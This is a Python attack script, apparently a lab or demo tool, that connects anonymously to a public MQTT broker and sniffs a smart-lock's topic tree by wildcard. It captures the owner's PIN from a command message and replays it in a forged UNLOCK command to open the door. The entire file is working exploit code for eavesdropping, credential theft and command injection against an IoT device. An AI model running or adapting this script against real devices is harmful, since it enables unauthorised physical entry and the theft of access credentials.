# mqtt_hijacker.py - Eavesdropping & Command Injection
import paho.mqtt.client as mqtt
import json
import time

MQTT_BROKER = "broker.emqx.io"
PORT = 1883
TOPIC_BASE = "enterprise/lab/smartlock/door_1"

captured_pin = None

def on_connect(client, userdata, flags, rc, properties=None):
    print("[+] Attacker connected to IoT Broker anonymously.")
    # VULNERABILITY: Subscribing to the wildcard allows intercepting ALL traffic
    print(f"[*] Sniffing traffic on {TOPIC_BASE}/# ...")
    client.subscribe(f"{TOPIC_BASE}/#")

def on_message(client, userdata, msg):
    global captured_pin
    payload = msg.payload.decode()
    topic = msg.topic
    
    # Eavesdropping Phase
    if "command" in topic and not captured_pin:
        try:
            data = json.loads(payload)
            if "pin" in data:
                captured_pin = data["pin"]
                print(f"\n[+] INTERCEPT SUCCESS! Captured Owner's PIN: {captured_pin}")
                print("[*] Initiating Command Injection Phase...")
                inject_command(client)
        except:
            pass

def inject_command(client):
    """Hijacks the IoT device by replaying the intercepted PIN."""
    print(f"[*] Forging malicious UNLOCK payload...")
    malicious_payload = json.dumps({"action": "UNLOCK", "pin": captured_pin})
    
    time.sleep(2) # Brief pause for effect
    print(f"[!] Injecting command into {TOPIC_BASE}/command")
    client.publish(f"{TOPIC_BASE}/command", malicious_payload)
    print("[+] Exploit Complete. The door should now be open.")

if __name__ == "__main__":
    # THE FIX: Explicitly passing the Callback API Version for paho-mqtt 2.0+
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "Attacker_Device")
    client.on_connect = on_connect
    client.on_message = on_message

    print("[*] Launching IoT Hijacker...")
    client.connect(MQTT_BROKER, PORT, 60)
    client.loop_forever()